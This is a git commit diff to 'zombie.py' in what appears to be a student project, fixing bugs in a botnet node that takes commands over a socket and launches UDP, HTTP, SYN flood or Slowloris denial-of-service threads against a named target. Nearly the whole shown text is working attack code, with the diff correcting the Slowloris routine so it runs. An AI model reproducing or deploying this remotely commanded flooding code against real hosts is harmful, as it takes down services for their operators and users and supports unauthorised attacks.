bffb930d7465f1583d48a28898bb525c43cebde4
cgt2 <codythomas2013@gmail.com>
2013-12-12 18:14:10 -0800

    FDSF

--- project3/zombie.py
+++ project3/zombie.py
@@ -11,7 +11,7 @@ class zombie(SocketServer.BaseRequestHandler):
     def handle(self):
         self.data = self.request.recv(1024).strip()
         attack, target, timeout, port, threads = self.data.split(" ")
-        kwargs = {'attack':attack, 'target':target, 'timeout':timeout, 'port':port, 'threads':threads}
+        kwargs = {'attack':attack, 'target':target, 'timeout':timeout, 'port':port}
         self.request.sendall("ACK")
         if attack == "udp":
             fun = attackUDPFlood
@@ -19,7 +19,7 @@ class zombie(SocketServer.BaseRequestHandler):
             fun = attackHTTPFlood
         elif attack == "syn":
             fun = attackSYNFlood
-        elif attack == "slowloris"
+        elif attack == "slowloris":
             fun = attackSlowLoris
         for i in xrange(int(threads)):
             attacker = fun(**kwargs)
@@ -84,18 +84,18 @@ class attackSYNFlood(threading.Thread):
 class attackSlowLoris(threading.Thread):
     def __init__(self, **kwargs):
         threading.Thread.__init__(self)
-        self.timoutAttack = kwargs['timeout']
+        self.timeoutAttack = kwargs['timeout']
         self.target = kwargs['target']
-        self.threads = kwargs['threads']
 
     def run(self):
         req = 'GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:25.0) Gecko/20100101 Firefox/25.0\r\n' % (self.target)
+        start = time.time()
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((this.target, 80))
+            s.connect((self.target, 80))
             index = 0
-            while time.time() - start < self.timeoutAttack && index < len(req):
-                time.sleep(self.threads)
+            while time.time() - start < self.timeoutAttack and index < len(req):
+                time.sleep(3)
                 s.send(req[index])
                 index += 1
         except Exception, e:
